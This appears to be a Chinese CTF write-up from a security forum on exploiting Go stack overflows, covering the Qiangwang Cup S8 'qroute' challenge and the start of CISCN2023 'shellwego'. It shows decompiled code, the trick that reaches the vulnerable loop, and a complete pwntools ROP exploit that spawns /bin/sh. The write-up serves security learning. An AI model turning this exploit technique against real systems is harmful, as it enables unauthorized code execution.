---
title: go中栈溢出的总结
url: https://forum.butian.net/share/3897
source: 奇安信攻防社区
date: 2024-11-22
fetch_date: 2025-10-06T19:13:50.744794
---

# go中栈溢出的总结

#

[问答](https://forum.butian.net/questions)

*发起*

* [提问](https://forum.butian.net/question/create)
* [文章](https://forum.butian.net/share/create)

[攻防](https://forum.butian.net/community)
[活动](https://forum.butian.net/movable)

Toggle navigation

* [首页 (current)](https://forum.butian.net)
* [问答](https://forum.butian.net/questions)
* [商城](https://forum.butian.net/shop)
* [实战攻防技术](https://forum.butian.net/community)
* [漏洞分析与复现](https://forum.butian.net/articles)
  NEW
* [活动](https://forum.butian.net/movable)
* [摸鱼办](https://forum.butian.net/questions/Play)

搜索

* [登录](https://forum.butian.net/login)
* [注册](https://user.skyeye.qianxin.com/user/register?next=http://forum.butian.net/btlogin)

### go中栈溢出的总结

本篇文章详细记录了自己复现强网杯S8中qroute这道题的过程，并又做了一些CISCN中go的栈溢出相关题目，记录了复现过程遇到的困难，以及解决方法，希望能对你学习go的栈溢出有所帮助

自从CISCN过后，又好久没有遇到什么go中的栈溢出了。这次打了强网有个qroute也是go中的栈溢出，借此机会复现这道题同时再做一下之前做过的go的栈溢出，总结一下go中栈溢出应该怎么发现利用
强网杯S8-qroute
============
此题是参考[ACT的WP复现的](https://mp.weixin.qq.com/s?\_\_biz=Mzg2OTcyODc1OA==&mid=2247488557&idx=1&sn=8653a99a5f38d001314aaecea2372c36&chksm=cf29e120dff605fb9609de0ea5a958bc5a23876a3a549aeeb8c419360a0caebed6f8335bd372&mpshare=1&scene=23&srcid=1105BcA7zCWxRx1qSMOFMEMG&sharer\_shareinfo=5cd711fae5bd0dbe20177b28aa4db5df&sharer\_shareinfo\_first=5cd711fae5bd0dbe20177b28aa4db5df#rd),在复现的基础上记录一下自己遇到的困难以及如何解决
第一阶段
----
- 正常逆向后发现程序有如下功能
```text
cert 4ceb539da109caf8eea7
set dns/set route/set interface
set dns primary 8.8.8.8
set route 192.168.1.0/24 gateway 192.168.0.1
set interface eth0 ip 192.168.0.10 netmask 255.255.255.0
show routes/show interfaces/show dns/show logs
delete route/delete interface/delete dns $var
exec ping host $var
exec traceroute $var
exit
logout
```
\*\*这个cert很好过（和CISCN的shellwego有点像，都是要先cert），直接就看到是个RC4\*\*
![image.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2024/11/attach-1890ed947fcb1f455a823126f9ee5f1be0751fcf.png)
![image.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2024/11/attach-08c3d50981a5f8c8ff97967d411615ab43778cd8.png)
接下来要做的就是逆向各个功能，但是发现大部分函数都比较正常，在\*\*exec ping\*\*中发现有个很可疑的地方
![84.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2024/11/attach-2864ba6833b508882f9387469625b136ce2d83a8.png)
\*\*go中的string一般会先存在一个比栈还高的地址，可以看到v29是可以根据v71=len不断累加的，然而赋值是个for循环， &amp;v79\[v29 + 1 + j\]是个栈上的地址，如果长度不合理，那么将覆盖返回地址\*\*
\*\*在go中，经常会看到这样的结构，buf\[i\]存的是一个指针，这个指针指向一个字符串，buf\[i+1\]存的是这个字符串的长度，可以看到v71 = \\*(\\_QWORD \\*)(v28 + 8);也是这种结构\*\*
所以我们可以大胆猜测，这个strings\\_genSplit过后，\*\*返回的是一个结构体数组，每个结构体元素是有(void \\*)ptr,int64 len这种结构\*\*，这里就是通过'.'这个字符进行分割，我进行了验证发现确实如此
![image.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2024/11/attach-0e22ce8c3281988e440551d1c9a84a9ef42f1a83.png)
![image.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2024/11/attach-04109785d70d5cfa1ecd3d02bbdb9b9a8c78a23f.png)
```c
//看到split就可以想到是通过某个字符来对整个字符串进行分割，这里是'.'
v26 = strings\_genSplit(a2,v102,(unsigned int)&unk\_53BC00,1,0,-1,v13,v14,v15,(\_\_int64)v75.ptr,v75.len,v76,v77);
j = (\_\_int64)v79;
v28 = ((\_\_int64 (\_\_golang \*)(\_\_int64, \_\_int64, \_\_int64, char \*))loc\_4704F4)(v26, v102, v27, v79);
v29 = 0LL;
while ( v24 > 0 )
{
//看到这里可以想到v28像是一个数组，v28[i]存着指针，v28[i+1]存着len，所以会有v71 = \*(\_QWORD \*)(v28 + 8);这种赋值
v71 = \*(\_QWORD \*)(v28 + 8);
if ( v71 > 0x3F )
{
v96 = v10;
v72 = runtime\_convT64(v71, v24, v29, j, (int)v25, (int)v12, v13, v14, v15, (\_\_int64)v75.ptr);
\*(\_QWORD \*)&v96 = &RTYPE\_int;
\*((\_QWORD \*)&v96 + 1) = v72;
return fmt\_Fprintf((unsigned int)off\_53D3C8,qword\_5EC508,(unsigned int)"Label length exceeds 0x3F: %d\n",30,(unsigned int)&v96,1,1,v73,
v74,(\_\_int64)v75.ptr,v75.len,v76,v77,v78);
}
v25 = \*(unsigned \_\_int8 \*\*)v28;
v79[v29] = v71;
//所以v29是可以根据v71=len不断累加的，这种漏洞非常常见
if ( !v25 )
v25 = (unsigned \_\_int8 \*)&unk\_60C780;
for ( j = 0LL; j < v71; ++j )
{
v12 = &v79[v29 + 1 + j];
LODWORD(v13) = v25[j];
\*v12 = v13;
}
v28 += 16LL;
--v24;
v29 += v71 + 1;
}
```
第二阶段
----
根据上面的分析，可以确定就是用很多'.'字符来让len增加，\*\*一个'.'的len是0，所以这个for循环会立刻退出，但是v29 += v71 + 1;又让v29加1\*\*，所以可以实现让len增加，所以正常的也会想出如下的exp来覆盖返回地址
但是实际跑的时候会不对，所以我又进行了很长的逆向分析过程分析为什么直接这样不行
```python
payload = b"."\*0x207+p64(pop\_rbp) + p64(bss)+ p64(pop\_rcx) + p64(0x200) + p64(pop\_rbx) + p64(0x006102B0) + p64(sys\_read) + p64(leave\_ret)[:5]
p.sendlineafter("Router",b"exec ping host " +payload)
```
主要原因在这里,如果j&lt;=0，那么会\*\*有如下调用链LABEL\\_15-&gt;net\\_LookupIP-&gt;return ，这就直接返回了，根本走不到strings\\_genSplit以及那个for循环\*\*
```c
v18 = v99;
v21 = \*(\_\_int128 \*\*)(v99 + 0x40);
j = \*(\_QWORD \*)(v99 + 0x48);
len = v102;
while ( 1 )
{
v22 = j <= 0;
if ( j <= 0 )
{
v17 = len;
ptr = (char \*)a2;
goto LABEL\_15;
}
v23 = \*((\_QWORD \*)v21 + 1);
v12 = (char \*)\*((\_QWORD \*)v21 + 2);
v13 = \*((\_QWORD \*)v21 + 3);
if ( len == v23 )
break;
LABEL\_8:
v21 += 2;
--j;
}
```
这里我就很不明白，\*\*可以看到ACT战队师傅的WP里面是有set\\_dns(payload,b'1.1.1.1')这一步的\*\*，于是我ida动调跟进看了看
![image.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2024/11/attach-01973f6ec686820548fc8e4c8c23bf6f88e13219.png)
可以看到set dns后这里的j变成了1
![image.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2024/11/attach-1a4a6be39c9576691b76b23efa42ab3fcc2f09c4.png)
如果不做set dns对应的地方的值是这样的
![image.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2024/11/attach-fbf9d2ed07088133e75882c742b8de0fb544a032.png)
我又做了如下尝试
```text
set dns aaaa 1.1.1.1
set dns bbbb 2.2.2.2
exec ping host aaaa
```
跟进看到如下结果，这里的j对应的值又变成了2
![image.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2024/11/attach-d05883057b6433fd6946f56be4d138e03d5f7950.png)
所以可以得出结论，这里的set dns之后会在栈上有相应的记录，这个j = \\*(\\_QWORD \\*)(v99 + 0x48);的赋值应该就是设置的dns的数目
\*\*确实是搞清楚了这一步的原因，但是对于我来说，如果我在比赛中做这个题，我该如何想到是这一步的影响呢，这里我还没有想通，即使我再怎么动调，可能还是难以想到这里是set dns导致了程序流程这样的走向，可能这还需要一点猜测和悟性\*\*
第三阶段
----
解决了上述问题后，能够覆盖到返回地址，基本上就是个布置ROP了，没有太多难度，需要注意golang函数调用方式，可以参考[这篇文章](https://www.jianshu.com/p/33c07f807ba9)
- exp
```python
from pwnlib.util.packing import u64
from pwnlib.util.packing import u32
from pwnlib.util.packing import u16
from pwnlib.util.packing import u8
from pwnlib.util.packing import p64
from pwnlib.util.packing import p32
from pwnlib.util.packing import p16
from pwnlib.util.packing import p8
from pwn import \*
from ctypes import \*
from Crypto.Cipher import ARC4
context(os='linux', arch='amd64', log\_level='debug')
p = process("/home/zp9080/PWN/route")
# p=gdb.debug("/home/zp9080/PWN/pwn",'b \*0x8049324')
# p=remote('0192d5d3be0f782ea43281dc0cf29672.3iz5.dg04.ciihw.cn',46453)
# p=process(['seccomp-tools','dump','/home/zp9080/PWN/pwn'])
# elf = ELF("/home/zp9080/PWN/pwn")
# libc=elf.libc
#b \*$rebase(0x14F5)
def dbg():
gdb.attach(p,'b \*0x4D858C')
pause()
def set\_dns(dns,ip):
p.sendlineafter(b"Router",b"set dns " + dns + b" " + ip)
def set\_route(route):
p.sendlineafter("Router",b"set route " + route)
def exec(cmd):
p.sendlineafter("Router",b"exec " + cmd)
p.sendline(b'cert 4ceb539da109caf8eea7')
p.sendline(b'configure')
pop\_rax\_rbp = 0x0000000000405368
pop\_rbx = 0x0000000000461dc1
pop\_rcx = 0x0000000000433347
bss = 0x006102B0
pop\_rbp = 0x0000000000401030#: pop rbp ; ret
sys\_read = 0x0048DB60
leave\_ret = 0x00000000004a721a
payload = b"."\*0x207+p64(pop\_rbp) + p64(bss)+ p64(pop\_rcx) + p64(0x200) + p64(pop\_rbx) + p64(0x006102B0) + p64(sys\_read) + p64(leave\_ret)[:5]
set\_dns(payload,b'1.1.1.1')
# dbg()
p.sendlineafter("Router",b"exec ping host " +payload)
syscall = 0x004735A9 #mov rdi, rbx;syscall
payload = p64(0) + p64(pop\_rax\_rbp) + p64(0x3b) + p64(0) + p64(pop\_rbx) + p64(bss+0x100) + p64(syscall)
p.sendline(payload.ljust(0x100,b"\x00")+b"/bin/sh\x00")
p.interactive()
```
CISCN2023 shellwego
===================
第一阶段
----
这里先捋一下各个函数之间的调用关系
main\\_main打印ciscnshell$或者nightingale#，然后调用main\\_unk\\_func0b05，\*\*main\\_unk\\_func0b05是主要的函数，cert过后可以执行一些限制的命令。\*\*
\*\*如果输入cert会进入main\\_unk\\_func0b01函数，输入echo就会进入main\\_unk\\_func0b04，在main\\_unk\\_func0b04再调用main\\_unk\\_func0b03\*\*
所以第一步我们要先过了cert，可以看func1中看到就是一个RC4加密然后进行base64，与JLIX8pbSvYZu/WaG字符串进行比较看看是否相同，RC4密钥也给了，所以可以想到就是直接cert S33UAga1n@#! 但是会报错Missing parameter
![image.png](https://cdn-yg-zzbm.yun.qi...